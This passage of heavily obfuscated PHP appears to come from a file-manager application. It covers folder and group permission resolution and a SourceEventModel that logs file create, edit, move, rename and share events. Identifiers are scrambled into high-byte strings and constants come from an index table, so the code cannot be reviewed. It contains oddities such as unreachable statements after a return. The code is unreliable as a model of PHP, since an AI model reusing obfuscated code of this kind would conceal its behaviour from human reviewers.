$this->groupRootAuth($íÅ›ÆõÇ, $áığøƒê) : !1; if ($‹‹œ˜èŒ && Model($ëéßôŸ“[552])->authCheckAction($‹‹œ˜èŒ[$ëéßôŸ“[466]], $ëéßôŸ“[1909])) { return $this->groupAuthInfo($‹‹œ˜èŒ, $íÅ›ÆõÇ); } $¢¼ ¬ = Model($ëéßôŸ“[1374])->parentLevelArray($ŞáäêØ»[$ëéßôŸ“[565]]); $¢¼ ¬ = array_merge(array($ŞáäêØ»[$ëéßôŸ“[183]]), array_reverse($¢¼ ¬)); $˜½æ°¤ø = !1; foreach ($¢¼ ¬ as $ğÀ—Â†Û) { if (!isset($˜„Š¦¸[$ğÀ—Â†Û])) { continue; } $ëÂ¬˜ı¤ = $this->authMake($˜„Š¦¸[$ğÀ—Â†Û], $áığøƒê); if ($ëÂ¬˜ı¤[$ëéßôŸ“[519]]) { $˜½æ°¤ø = $ëÂ¬˜ı¤; break; } } if (!$¨õÖıàÏ) { return $˜½æ°¤ø; } if (!$˜½æ°¤ø && $‹‹œ˜èŒ) { $˜½æ°¤ø = $this->groupAuthInfo($‹‹œ˜èŒ, $íÅ›ÆõÇ); } if (!$˜½æ°¤ø) { $Öû˜‘Ó” = Model($ëéßôŸ“[566])->getInfo($íÅ›ÆõÇ); $øÀûù£ª = explode($ëéßôŸ“[50], trim($Öû˜‘Ó”[$ëéßôŸ“[565]], $ëéßôŸ“[50])); $øÀûù£ª = array_reverse($øÀûù£ª); foreach ($øÀûù£ª as $Ğİ×úù) { if ($Ğİ×úù == $ëéßôŸ“[214] || $Ğİ×úù == $·õ²ê) { continue; } $—¯Â–¿à = $this->groupRootAuth($Ğİ×úù, $áığøƒê); if (!$—¯Â–¿à) { continue; } $˜½æ°¤ø = $this->groupAuthInfo($—¯Â–¿à, $Ğİ×úù); break; } } if (!$˜½æ°¤ø || $˜½æ°¤ø[$ëéßôŸ“[467]] <= 0) { $¯äúğ€Æ = $this->authDeepCheck($ŞáäêØ»[$ëéßôŸ“[183]], $áığøƒê); if ($¯äúğ€Æ) { $˜½æ°¤ø = $¯äúğ€Æ; } } return $˜½æ°¤ø; } private function userIsRoot($‡áï¹“ = false) { $®¼ˆÂí =& $_SERVER[ •ŒÓîÆ]; if (!$‡áï¹“ && _get($GLOBALS, $®¼ˆÂí[548])) { return !0; } $¼–¨ıöÇ = Model($®¼ˆÂí[579])->getInfo($‡áï¹“); $Ó¶€²ã = Model($®¼ˆÂí[2089])->listData($¼–¨ıöÇ[$®¼ˆÂí[1563]]); if ($Ó¶€²ã && $Ó¶€²ã[$®¼ˆÂí[556]][$®¼ˆÂí[2090]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ìöû³†) { $­€Å˜µÆ =& $_SERVER[ •ŒÓîÆ]; $ô¤”äÁÖ = Model($­€Å˜µÆ[1374]); $œÃîî‚ã = $ô¤”äÁÖ->sourceInfo($Ìöû³†); if (!$œÃîî‚ã) { return !1; } $ô¤”äÁÖ->groupPathDisplay($œÃîî‚ã); $ˆ†‹±Î… = array($œÃîî‚ã); $ˆ†‹±Î… = $ô¤”äÁÖ->_listAppendPath($ˆ†‹±Î…); $œÃîî‚ã = $ˆ†‹±Î…[0]; $ªÙ©ò = $œÃîî‚ã[$­€Å˜µÆ[563]]; if (isset($œÃîî‚ã[$­€Å˜µÆ[571]])) { $ƒ§şÂ¬Ğ = explode($­€Å˜µÆ[8], trim($œÃîî‚ã[$­€Å˜µÆ[563]], $­€Å˜µÆ[8])); array_shift($ƒ§şÂ¬Ğ); $ªÙ©ò = $œÃîî‚ã[$­€Å˜µÆ[569]] . $­€Å˜µÆ[2091] . implode($­€Å˜µÆ[8], $ƒ§şÂ¬Ğ); } return array($­€Å˜µÆ[473] => $œÃîî‚ã[$­€Å˜µÆ[32]], $­€Å˜µÆ[86] => KodIO::make($œÃîî‚ã[$­€Å˜µÆ[183]]), $­€Å˜µÆ[2092] => $ªÙ©ò); } private function groupAuthInfo($ÒÕ…ÙĞ„, $°ÕÈëíç) { $Çšî´çì =& $_SERVER[ •ŒÓîÆ]; $ÓéÒ·Ôá = Model($Çšî´çì[566])->getInfo($°ÕÈëíç); return array($Çšî´çì[2093] => intval($ÒÕ…ÙĞ„[$Çšî´çì[466]]), $Çšî´çì[2077] => $ÒÕ…ÙĞ„, $Çšî´çì[2094] => LNG($Çšî´çì[2095]), $Çšî´çì[2086] => array($Çšî´çì[473] => $ÓéÒ·Ôá[$Çšî´çì[32]], $Çšî´çì[86] => KodIO::make($ÓéÒ·Ôá[$Çšî´çì[89]][$Çšî´çì[183]]), $Çšî´çì[2092] => $ÓéÒ·Ôá[$Çšî´çì[570]])); } protected function groupRootAuth($ßôßâã´, $Âò‡„¿ı = false) { $ÙãËÀ =& $_SERVER[ •ŒÓîÆ]; $Âò‡„¿ı = $Âò‡„¿ı ? $Âò‡„¿ı : USER_ID; $éõª†‰ = $Âò‡„¿ı . $ÙãËÀ[2096] . $ßôßâã´; static $˜Œí…¶ = array(); if (isset($˜Œí…¶[$éõª†‰])) { return $˜Œí…¶[$éõª†‰]; } $¢ğüÆêÈ = Model($ÙãËÀ[566])->getInfo($ßôßâã´); $—ÑÈè°Æ = $this->userGroupList($Âò‡„¿ı); $‚Ô†ƒø¹ = isset($—ÑÈè°Æ[$ßôßâã´]) ? $—ÑÈè°Æ[$ßôßâã´][$ÙãËÀ[466]] : !1; if ($‚Ô†ƒø¹ && Model($ÙãËÀ[552])->authCheckAction($‚Ô†ƒø¹[$ÙãËÀ[466]], $ÙãËÀ[1909])) { $˜Œí…¶[$éõª†‰] = $‚Ô†ƒø¹; return $‚Ô†ƒø¹; } $ö°ôÛÆæ = $this->sourceAuthSelect($¢ğüÆêÈ[$ÙãËÀ[89]][$ÙãËÀ[183]]); $˜§Àğß = $ö°ôÛÆæ ? $this->authMake($ö°ôÛÆæ, $Âò‡„¿ı) : !1; $¤Ÿ¤Ûéã = $˜§Àğß ? $˜§Àğß[$ÙãËÀ[519]] : !1; $˜Œí…¶[$éõª†‰] = $¤Ÿ¤Ûéã ? $¤Ÿ¤Ûéã : $‚Ô†ƒø¹; return $˜Œí…¶[$éõª†‰]; } public function authOwnerApply($òÁĞˆˆè) { $üÅüùˆ– =& $_SERVER[ •ŒÓîÆ]; if (empty($òÁĞˆˆè[$üÅüùˆ–[466]]) || isset($òÁĞˆˆè[$üÅüùˆ–[2097]]) && $òÁĞˆˆè[$üÅüùˆ–[2097]]) { return $òÁĞˆˆè; } if (AuthModel::authCheckRoot($òÁĞˆˆè[$üÅüùˆ–[466]][$üÅüùˆ–[467]])) { return $òÁĞˆˆè; } $ËúÂÔĞú = Model($üÅüùˆ–[1374])->parentLevelArray($òÁĞˆˆè[$üÅüùˆ–[565]]); $ËúÂÔĞú = array_merge(array($òÁĞˆˆè[$üÅüùˆ–[183]]), array_reverse($ËúÂÔĞú)); $½ÉÂˆğµ = $this->sourceAuthSelect($ËúÂÔĞú); $øˆˆşñ… = array(); $ò½ÇÙ´¦ = array(); foreach ($½ÉÂˆğµ as $‚‚Üß½Ü => $¶ÍÌš»û) { $¾»ïçŠß = $this->authFolderOwnerUser($¶ÍÌš»û); $øˆˆşñ…[$‚‚Üß½Ü] = $¾»ïçŠß; $ò½ÇÙ´¦ = array_merge($ò½ÇÙ´¦, $¾»ïçŠß[$üÅüùˆ–[642]]); if ($¾»ïçŠß[$üÅüùˆ–[2098]]) { break; } } if (count($ò½ÇÙ´¦) == 0) { $ò½ÇÙ´¦ = $this->authFolderOwnerGroup($òÁĞˆˆè[$üÅüùˆ–[550]]); } $ò½ÇÙ´¦ = array_unique($ò½ÇÙ´¦); if (AuthModel::authCheckRoot($òÁĞˆˆè[$üÅüùˆ–[466]][$üÅüùˆ–[467]])) { $ò½ÇÙ´¦[] = USER_ID; } $òÁĞˆˆè[$üÅüùˆ–[466]][$üÅüùˆ–[2099]] = Model($üÅüùˆ–[558])->userListInfo($ò½ÇÙ´¦); return $òÁĞˆˆè; } private function authFolderOwnerGroup($“‘äù…–) { $¾ÇÃğ¦Ü =& $_SERVER[ •ŒÓîÆ]; $ØëÊ‡Şñ = Model($¾ÇÃğ¦Ü[1978])->where(array($¾ÇÃğ¦Ü[1888] => $“‘äù…–))->select(); $ëĞ½ÆË = array(); if (!$ØëÊ‡Şñ) { return $ëĞ½ÆË; } foreach ($ØëÊ‡Şñ as $¾Ö°±‚§) { $øƒ¨§ó¯ = $this->authInfo($¾Ö°±‚§); if (AuthModel::authCheckRoot($øƒ¨§ó¯[$¾ÇÃğ¦Ü[466]])) { $ëĞ½ÆË[] = $¾Ö°±‚§[$¾ÇÃğ¦Ü[1690]]; } } return $ëĞ½ÆË; } private function authFolderOwnerUser($…¯†¬œ) { $ ¬¾ Ã =& $_SERVER[ •ŒÓîÆ]; $ò÷È¡ = array(); $îÉËÔ´‘ = !1; foreach ($…¯†¬œ as $¶–ŸÓ») { $µ‚ÒÂÄ = $this->authInfo($¶–ŸÓ»); if ($¶–ŸÓ»[$ ¬¾ Ã[550]] == $ ¬¾ Ã[214]) { $îÉËÔ´‘ = !0; } if ($¶–ŸÓ»[$ ¬¾ Ã[180]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($µ‚ÒÂÄ[$ ¬¾ Ã[466]])) { $ò÷È¡[] = $¶–ŸÓ»[$ ¬¾ Ã[550]]; } } } return array($ ¬¾ Ã[642] => $ò÷È¡, $ ¬¾ Ã[2098] => $îÉËÔ´‘); } public function authMake($‹‰øŞáƒ, $ˆì‡ñø‰ = false) { $¥¦ÙÇä =& $_SERVER[ •ŒÓîÆ]; $©áıÊø“ = $this->authArrayCheck($‹‰øŞáƒ, $ˆì‡ñø‰); if ($©áıÊø“[$¥¦ÙÇä[2100]]) { $©áıÊø“[$¥¦ÙÇä[2100]] = $this->sourceAuthInfo($©áıÊø“[$¥¦ÙÇä[2100]]); } return $©áıÊø“; } public function authArrayCheck($¸òùİ´, $¶€šÃ = false) { $ñ‚ù•äÛ =& $_SERVER[ •ŒÓîÆ]; if (!$¸òùİ´) { return array($ñ‚ù•äÛ[467] => 0, $ñ‚ù•äÛ[519] => !1); } $¶€šÃ = $¶€šÃ ? $¶€šÃ : USER_ID; $¾•”¯úß = 0; $„†µŠ = 0; $‘ıªÛ¸ = 0; $Ó„´Éá³ = 0; $¿õÂ‡¹ = 0; $–ÂÙ©» = 0; $£åğì„ó = 1000; $Õ±¬Åê = 0; $šİò»ò¿ = 0; $ÄìšŸ± = 0; $’ÎÇ¹æ² = 0; $ô­™´Ã¿ = array($ñ‚ù•äÛ[183] => 0); foreach ($¸òùİ´ as $ô­™´Ã¿) { $”Œ³ƒ² = $this->authInfo($ô­™´Ã¿); if (!$”Œ³ƒ²) { continue; } $™ šõ¨ = $ô­™´Ã¿[$ñ‚ù•äÛ[550]]; $Ü±õö¥ã = intval($”Œ³ƒ²[$ñ‚ù•äÛ[466]]); if ($ô­™´Ã¿[$ñ‚ù•äÛ[180]] == SourceModel::TYPE_USER && $™ šõ¨ == $¶€šÃ) { $¾•”¯úß = !0; $‘ıªÛ¸ = $”Œ³ƒ²; $„†µŠ = $Ü±õö¥ã; } else { if ($ô­™´Ã¿[$ñ‚ù•äÛ[180]] == SourceModel::TYPE_GROUP && $this->groupContainUser($™ šõ¨, $¶€šÃ)) { $Ó„´Éá³ = !0; $ëÉÖ¨ = $this->groupStepToUserGroup($™ šõ¨, $¶€šÃ); if ($ëÉÖ¨ < $£åğì„ó) { $£åğì„ó = $ëÉÖ¨; $¿õÂ‡¹ = $Ü±õö¥ã; $–ÂÙ©» = $”Œ³ƒ²; $Õ±¬Åê = $™ šõ¨; } if ($ëÉÖ¨ == $£åğì„ó && $Ü±õö¥ã >= $¿õÂ‡¹) { $¿õÂ‡¹ = $Ü±õö¥ã; $–ÂÙ©» = $”Œ³ƒ²; $Õ±¬Åê = $™ šõ¨; } } else { if ($™ šõ¨ == $ñ‚ù•äÛ[214]) { $šİò»ò¿ = !0; $’ÎÇ¹æ² = $”Œ³ƒ²; $ÄìšŸ± = $Ü±õö¥ã; } } } } if ($¾•”¯úß) { $¤Àœìí½ = $„†µŠ; $”Œ³ƒ² = $‘ıªÛ¸; $Ü†Ğ¦éÏ = LNG($ñ‚ù•äÛ[2101]); } else { if ($Ó„´Éá³) { $¤Àœìí½ = $¿õÂ‡¹; $”Œ³ƒ² = $–ÂÙ©»; $ÃùÓ¼§ = Model($ñ‚ù•äÛ[566])->getInfo($Õ±¬Åê); $Ü†Ğ¦éÏ = $ñ‚ù•äÛ[165] . $ÃùÓ¼§[$ñ‚ù•äÛ[570]] . $ñ‚ù•äÛ[2102] . LNG($ñ‚ù•äÛ[2103]); } else { if ($šİò»ò¿) { $¤Àœìí½ = $ÄìšŸ±; $”Œ³ƒ² = $’ÎÇ¹æ²; $Ü†Ğ¦éÏ = LNG($ñ‚ù•äÛ[2074]); } else { $¤Àœìí½ = 0; $”Œ³ƒ² = !1; $Ü†Ğ¦éÏ = $ñ‚ù•äÛ[12]; } } } $“À²ç…¬ = array($ñ‚ù•äÛ[2093] => intval($¤Àœìí½), $ñ‚ù•äÛ[2077] => $”Œ³ƒ², $ñ‚ù•äÛ[2094] => $Ü†Ğ¦éÏ, $ñ‚ù•äÛ[2086] => $ô­™´Ã¿[$ñ‚ù•äÛ[183]]); return $“À²ç…¬; } private function groupContainUser($·õäéáˆ, $®ì´Âš = false) { return in_array($·õäéáˆ, $this->userGroupParents($®ì´Âš)); } private function groupStepToUserGroup($Üğ»­ìÎ, $¾Ğ²·©í = false) { $¥ò»èÂó =& $_SERVER[ •ŒÓîÆ]; $È‹âË†§ = $this->userGroupList($¾Ğ²·©í); $ĞÉ¢¹ú¬ = 1000; $Ş»‹Œßµ = $GLOBALS[$¥ò»èÂó[6]][$¥ò»èÂó[91]][$¥ò»èÂó[1991]] == 1; $ÚË¢ïÔÂ = $Ş»‹Œßµ ? 3 : 2; foreach ($È‹âË†§ as $³Ü£¥’“) { if ($³Ü£¥’“[$¥ò»èÂó[1888]] == $Üğ»­ìÎ) { return 0; } $øùŞšĞÒ = explode($¥ò»èÂó[50], trim($³Ü£¥’“[$¥ò»èÂó[565]], $¥ò»èÂó[50])); if ($øùŞšĞÒ[0] == $¥ò»èÂó[214] && count($øùŞšĞÒ) > $ÚË¢ïÔÂ) { $Şñùæç = array_reverse(array_slice($øùŞšĞÒ, $ÚË¢ïÔÂ)); $›†ê‚ÖÄ = array_search($Üğ»­ìÎ, $Şñùæç); if ($›†ê‚ÖÄ !== !1 && $›†ê‚ÖÄ + 1 <= $ĞÉ¢¹ú¬) { $ĞÉ¢¹ú¬ = $›†ê‚ÖÄ + 1; } } } return $ĞÉ¢¹ú¬; } private function userGroupList($²³·¤Ş© = false) { $¬À›òôÈ =& $_SERVER[ •ŒÓîÆ]; static $â«îÊåƒ = array(); if (isset($â«îÊåƒ[$²³·¤Ş©])) { return $â«îÊåƒ[$²³·¤Ş©]; } $†‚²øøÉ = Model($¬À›òôÈ[579])->getInfo($²³·¤Ş©); $â«îÊåƒ[$²³·¤Ş©] = array_to_keyvalue($†‚²øøÉ[$¬À›òôÈ[2075]], $¬À›òôÈ[1888]); return $â«îÊåƒ[$²³·¤Ş©]; } public function userGroupParents($šÑ†ış) { $âÓÅÉÎ =& $_SERVER[ •ŒÓîÆ]; static $¤Æ‰ƒ¨Ÿ = array(); $šÑ†ış = $šÑ†ış ? $šÑ†ış : USER_ID; if (isset($¤Æ‰ƒ¨Ÿ[$šÑ†ış])) { return $¤Æ‰ƒ¨Ÿ[$šÑ†ış]; } $é§ıÄı = $this->userGroupList($šÑ†ış); $¥ƒ³ëÏº = array(); $¡¤öôè¹ = $GLOBALS[$âÓÅÉÎ[6]][$âÓÅÉÎ[91]][$âÓÅÉÎ[1991]] == 1; $É¡¸ß“ = $¡¤öôè¹ ? 3 : 2; foreach ($é§ıÄı as $å§¯ã‘) { $öØŠÓ›‘ = array($å§¯ã‘[$âÓÅÉÎ[1888]]); $Á™±İ’ú = explode($âÓÅÉÎ[50], trim($å§¯ã‘[$âÓÅÉÎ[565]], $âÓÅÉÎ[50])); if ($Á™±İ’ú[0] == $âÓÅÉÎ[214] && count($Á™±İ’ú) > $É¡¸ß“) { $á –ö = array_slice($Á™±İ’ú, $É¡¸ß“); $öØŠÓ›‘ = array_merge($öØŠÓ›‘, array_reverse($á –ö)); } $¥ƒ³ëÏº = array_merge($¥ƒ³ëÏº, $öØŠÓ›‘); } $¤Æ‰ƒ¨Ÿ[$šÑ†ış] = array_unique($¥ƒ³ëÏº); return $¤Æ‰ƒ¨Ÿ[$šÑ†ış]; } public function authTargetInfoMake($ã˜È¯²) { $ßÚóÛµÅ =& $_SERVER[ •ŒÓîÆ]; $ù‚íîÔ = array(); $šŸŞÅ¥Ú = array(); foreach ($ã˜È¯² as $×°Ô˜Ô¯) { if ($×°Ô˜Ô¯[$ßÚóÛµÅ[180]] == SourceModel::TYPE_USER) { $ù‚íîÔ[] = intval($×°Ô˜Ô¯[$ßÚóÛµÅ[550]]); } else { if ($×°Ô˜Ô¯[$ßÚóÛµÅ[180]] == SourceModel::TYPE_GROUP) { $šŸŞÅ¥Ú[] = intval($×°Ô˜Ô¯[$ßÚóÛµÅ[550]]); } } } if ($ù‚íîÔ) { $ù‚íîÔ = Model($ßÚóÛµÅ[558])->userListInfo($ù‚íîÔ); } if ($šŸŞÅ¥Ú) { $Äá©ƒŒÑ = array($ßÚóÛµÅ[1976] => array($ßÚóÛµÅ[471], $šŸŞÅ¥Ú)); $šŸŞÅ¥Ú = Model($ßÚóÛµÅ[566])->field($ßÚóÛµÅ[2104])->where($Äá©ƒŒÑ)->select(); $šŸŞÅ¥Ú = array_to_keyvalue($šŸŞÅ¥Ú, $ßÚóÛµÅ[1888]); } return array($ßÚóÛµÅ[2105] => $ù‚íîÔ, $ßÚóÛµÅ[2106] => $šŸŞÅ¥Ú); } public function authInfo($‰°¬·¶) { $ì’éöÔ  =& $_SERVER[ •ŒÓîÆ]; if ($‰°¬·¶[$ì’éöÔ [1992]]) { $Æ¥¹šïê = Model($ì’éöÔ [552])->listData($‰°¬·¶[$ì’éöÔ [1992]]); if (!$Æ¥¹šïê) { return !1; $âØê¬İ¸ = Model($ì’éöÔ [552])->listData(); $ºÒè’á” = array_filter_by_field($âØê¬İ¸, $ì’éöÔ [466], $ì’éöÔ [214]); return $ºÒè’á”; } $õ ºŸÙÅ = array_field_key($Æ¥¹šïê, array($ì’éöÔ [453], $ì’éöÔ [32], $ì’éöÔ [466], $ì’éöÔ [1911], $ì’éöÔ [1912])); $õ ºŸÙÅ[$ì’éöÔ [2107]] = $‰°¬·¶; return $õ ºŸÙÅ; } else { return array($ì’éöÔ [472] => 0, $ì’éöÔ [1894] => $‰°¬·¶[$ì’éöÔ [2052]], $ì’éöÔ [473] => $ì’éöÔ [12], $ì’éöÔ [1911] => $ì’éöÔ [2108]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\143\x65\x5f\145\166\x65\x6e\x74"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\124\x69\155\145", "\164\151\155\145", "\x69\x6e\x73\145\x72\164", "\146\x75\x6e\143\164\151\x6f\x6e"), array("\144\x65\163\x63", '', "\x69\156\x73\145\162\164\x2c\x75\160\x64\141\164\x65\54\x73\x65\x6c\145\143\x74", "\x6a\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($·ÚºğŸ›, $ö—©æ´Ş, $Š„ï½ªÇ = '') { $¿†é‡‰ã =& $_SERVER[ •ŒÓîÆ]; if (!$this->eventSave) { return; } $ÈİŠüÉ˜ = Model($¿†é‡‰ã[1374])->sourceInfo($·ÚºğŸ›); if (!$ÈİŠüÉ˜) { return !1; } if ($this->isCacheEvent($ÈİŠüÉ˜, $ö—©æ´Ş)) { return; } if ($Š„ï½ªÇ && is_string($Š„ï½ªÇ)) { $Š„ï½ªÇ = array($¿†é‡‰ã[1927] => $Š„ï½ªÇ); } $›ÌĞåÑ = defined($¿†é‡‰ã[2109]) ? USER_ID : 0; $Øı‹ë« = array($¿†é‡‰ã[470] => $·ÚºğŸ›, $¿†é‡‰ã[2110] => $ÈİŠüÉ˜[$¿†é‡‰ã[182]], $¿†é‡‰ã[2111] => $ÈİŠüÉ˜[$¿†é‡‰ã[32]], $¿†é‡‰ã[563] => !empty($ÈİŠüÉ˜[$¿†é‡‰ã[563]]) ? $ÈİŠüÉ˜[$¿†é‡‰ã[563]] : $¿†é‡‰ã[12], $¿†é‡‰ã[1681] => $›ÌĞåÑ, $¿†é‡‰ã[475] => $ö—©æ´Ş, $¿†é‡‰ã[1683] => $Š„ï½ªÇ); $this->addSystemLog($ö—©æ´Ş, $Øı‹ë«); unset($Øı‹ë«[$¿†é‡‰ã[2111]], $Øı‹ë«[$¿†é‡‰ã[563]]); return $this->add($Øı‹ë«); } private function addSystemLog($•”ù«ù¥, $¢Éä‡æ) { $³„ÍÑ–¯ =& $_SERVER[ •ŒÓîÆ]; if ($•”ù«ù¥ == $³„ÍÑ–¯[2112]) { $•”ù«ù¥ = $¢Éä‡æ[$³„ÍÑ–¯[505]][$³„ÍÑ–¯[2113]]; } else { if (in_array($•”ù«ù¥, array($³„ÍÑ–¯[1868], $³„ÍÑ–¯[2114]))) { $•”ù«ù¥ = $¢Éä‡æ[$³„ÍÑ–¯[505]][$³„ÍÑ–¯[795]]; } } $ª¤âßñ© = array_merge($¢Éä‡æ, array($³„ÍÑ–¯[2115] => $¢Éä‡æ[$³„ÍÑ–¯[183]], $³„ÍÑ–¯[2116] => $¢Éä‡æ[$³„ÍÑ–¯[2116]])); Hook::trigger($³„ÍÑ–¯[2117], $³„ÍÑ–¯[2118] . $•”ù«ù¥, $¢Éä‡æ); Model($³„ÍÑ–¯[1832])->addLog($³„ÍÑ–¯[2118] . $•”ù«ù¥, $ª¤âßñ©); } private function isCacheEvent($Ïµô®¤ó, $…ÒˆÁÌ˜) { if ($Ïµô®¤ó[$_SERVER[ •ŒÓîÆ][180]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¶Ò­øÙò, $¦°¯ã†) { $´‹ öù‹ =& $_SERVER[ •ŒÓîÆ]; $¸Ğ»×»İ = Model($´‹ öù‹[1374])->sourceInfo($¶Ò­øÙò); $¿µèÀ­¦ = array($´‹ öù‹[2113] => $¦°¯ã†, $´‹ öù‹[32] => $¸Ğ»×»İ[$´‹ öù‹[32]]); return $this->addEvent($¶Ò­øÙò, $´‹ öù‹[2112], $¿µèÀ­¦); } public function eventFileEdit($í·Ó¯) { $ı©ñ÷Ï =& $_SERVER[ •ŒÓîÆ]; $œÊèâ½ä = array($ı©ñ÷Ï[2119] => $_SERVER[$ı©ñ÷Ï[2120]], $ı©ñ÷Ï[2121] => strtolower(ACTION)); if (isset($GLOBALS[$ı©ñ÷Ï[7]][$ı©ñ÷Ï[2122]])) { $œÊèâ½ä[$ı©ñ÷Ï[2122]] = $ı©ñ÷Ï[90]; } return $this->addEvent($í·Ó¯, $ı©ñ÷Ï[1858], $œÊèâ½ä); } public function eventRecycle($Œé°èßà, $È¹—Æğ—) { return $this->addEvent($Œé°èßà, $_SERVER[ •ŒÓîÆ][2114], $È¹—Æğ—); } public function eventRemove($€Ó‹) { $î¤¾³­ =& $_SERVER[ •ŒÓîÆ]; $ï…ñ…Æ¸ = Model($î¤¾³­[1374])->sourceInfo($€Ó‹); $Ğúùâ˜ï = $ï…ñ…Æ¸[$î¤¾³­[32]]; return $this->addEvent($ï…ñ…Æ¸[$î¤¾³­[182]], $î¤¾³­[1857], $Ğúùâ˜ï); } public function eventShare($Ş¬š€ªß, $’õ«©) { return $this->addEvent($Ş¬š€ªß, $_SERVER[ •ŒÓîÆ][1868], $’õ«©); } public function eventMove($×Ùò¹è—, $ÛÁ¢óÈ¹, $àÚñ¼â) { $ÍË‘Ö´§ =& $_SERVER[ •ŒÓîÆ]; $Ì¯¶õá = Model($ÍË‘Ö´§[1374]); $ŒÓ–§÷Ú = $Ì¯¶õá->sourceInfo($×Ùò¹è—); $¤÷Ù‡¹ = $Ì¯¶õá->sourceInfo($ÛÁ¢óÈ¹); $›‰‚ÕÇş = $Ì¯¶õá->sourceInfo($àÚñ¼â); $¥„ª¡É— = array($ÍË‘Ö´§[1201] => $ÛÁ¢óÈ¹, $ÍË‘Ö´§[2123] => $¤÷Ù‡¹[$ÍË‘Ö´§[32]], $ÍË‘Ö´§[2100] => !empty($¤÷Ù‡¹[$ÍË‘Ö´§[563]]) ? $¤÷Ù‡¹[$ÍË‘Ö´§[563]] : $ÍË‘Ö´§[12], $ÍË‘Ö´§[1202] => $àÚñ¼â, $ÍË‘Ö´§[2124] => $›‰‚ÕÇş[$ÍË‘Ö´§[32]], $ÍË‘Ö´§[2125] => !empty($›‰‚ÕÇş[$ÍË‘Ö´§[563]]) ? $›‰‚ÕÇş[$ÍË‘Ö´§[563]] : $ÍË‘Ö´§[12]); $this->addEvent($×Ùò¹è—, $ÍË‘Ö´§[600], $¥„ª¡É—); $ŒÓ–§÷Ú = $Ì¯¶õá->sourceInfo($×Ùò¹è—); $¥„ª¡É— = array($ÍË‘Ö´§[183] => $ŒÓ–§÷Ú[$ÍË‘Ö´§[183]], $ÍË‘Ö´§[32] => $ŒÓ–§÷Ú[$ÍË‘Ö´§[32]]); $this->addEvent($ÛÁ¢óÈ¹, $ÍË‘Ö´§[2126], $¥„ª¡É—); } public function eventCopy($×˜êş™) { $this->eventCreate($×˜êş™, $_SERVER[ •ŒÓîÆ][598]); } public function eventRename($†şË”ÆÁ, $ı±¢»¼², $şìœ¬ªŸ) { $˜üŒÀ»½ =& $_SERVER[ •ŒÓîÆ]; $™¦È”ÔÎ = array($˜üŒÀ»½[1201] => $ı±¢»¼², $˜üŒÀ»½[1202] => $şìœ¬ªŸ); return $this->addEvent($†şË”ÆÁ, $˜üŒÀ»½[1388], $™¦È”ÔÎ); } public function eventAddComment($ı»ÀÃé, $ÔÃí™½“) { return $this->addEvent($ı»ÀÃé, $_SERVER[ •ŒÓîÆ][2127], $ÔÃí™½“); } public function eventAddDesc($©ûÆ¹¤, $ï—ê°‹) { return $this->addEvent($©ûÆ¹¤, $_SERVER[ •ŒÓîÆ][2128], $ï—ê°‹); } public function listBySource($õ›õ…ßÏ) { $Óªòèè =& $_SERVER[ •ŒÓîÆ]; $œÎü¨—„ = Model($Óªòèè[1374])->sourceInfo($õ›õ…ßÏ); $—ÅÅ¯ = array($Óªòèè[470] => $õ›õ…ßÏ); if ($œÎü¨—„[$Óªòèè[464]] == $Óªòèè[90]) { $®êØ‚ ª = Model($Óªòèè[1374])->listSearchChildren($õ›õ…ßÏ, 20000); $®êØ‚ ª[] = $õ›õ…ßÏ . $Óªòèè[263]; $—ÅÅ¯ = array($Óªòèè[183] => array($Óªòèè[7], $®êØ‚ ª)); } $¥·´¡õ… = $this->where($—ÅÅ¯)->order($Óªòèè[2129])->selectPage(); if ($¥·´¡õ…[$Óªòèè[421]][$Óªòèè[422]] == 0) { $¥·´¡õ…[$Óªòèè[421]][$Óªòèè[422]] = 1; $¥·´¡õ…[$Óªòèè[424]] = array(array($Óªòèè[470] => $õ›õ…ßÏ, $Óªòèè[2110] => $œÎü¨—„[$Óªòèè[182]], $Óªòèè[1681] => $œÎü¨—„[$Óªòèè[506]], $Óªòèè[475] => $Óªòèè[2130], $Óªòèè[476] => $œÎü¨—„[$Óªòèè[217]], $Óªòèè[1683] => $Óªòèè[12])); } return $this->eventListParse($¥·´¡õ…, $õ›õ…ßÏ); } private function eventListParse($Õœşàí§, $‡§—ä²‡) { $¥•†ùš =& $_SERVER[ •ŒÓîÆ]; $Ä¿„åÁ˜ = $Õœşàí§[$¥•†ùš[424]]; $íÖ‚¦¶½ = array_to_keyvalue($Ä¿„åÁ˜, $¥•†ùš[12], $¥•†ùš[183]); $Ö¼¡Íï÷ = array_to_keyvalue($Ä¿„åÁ˜, $¥•†ùš[12], $¥•†ùš[2116]); foreach ($Ä¿„åÁ˜ as $øâ„Òİñ) { $êË—Œ­¨ = $øâ„Òİñ[$¥•†ùš[505]]; if ($øâ„Òİñ[$¥•†ùš[33]] == $¥•†ùš[600] && isset($êË—Œ­¨[$¥•†ùš[1201]])) { $íÖ‚¦¶½[] = $êË—Œ­¨[$¥•†ùš[1201]] . $¥•†ùš[12]; $íÖ‚¦¶½[] = $êË—Œ­¨[$¥•†ùš[1202]] . $¥•†ùš[12]; } if ($øâ„Òİñ[$¥•†ùš[33]] == $¥•†ùš[2126] && isset($êË—Œ­¨[$¥•†ùš[183]])) { $íÖ‚¦¶½[] = $êË—Œ­¨[$¥•†ùš[183]] . $¥•†ùš[12]; } } $íÖ‚¦¶½ = array_merge($íÖ‚¦¶½, $Ö¼¡Íï÷, array($‡§—ä²‡ . $¥•†ùš[12])); $íÖ‚¦¶½ = array_unique($íÖ‚¦¶½); $¸«–äöª = array_unique(array_to_keyvalue($Ä¿„åÁ˜, $¥•†ùš[12], $¥•†ùš[1690])); $û²ª¶§ = Model($¥•†ùš[579])->userListInfo($¸«–äöª); $ò…òš“ = Model($¥•†ùš[866])->sourceListInfo($íÖ‚¦¶½, !0); foreach ($Ä¿„åÁ˜ as &$øâ„Òİñ) { if ($øâ„Òİñ[$¥•†ùš[33]] == $¥•†ùš[600] && isset($øâ„Òİñ[$¥•†ùš[505]][$¥•†ùš[1201]])) { $øâ„Òİñ[$¥•†ùš[505]][$¥•†ùš[1201]] = $ò…òš“[$øâ„Òİñ[$¥•†ùš[505]][$¥•†ùš[1201]]]; 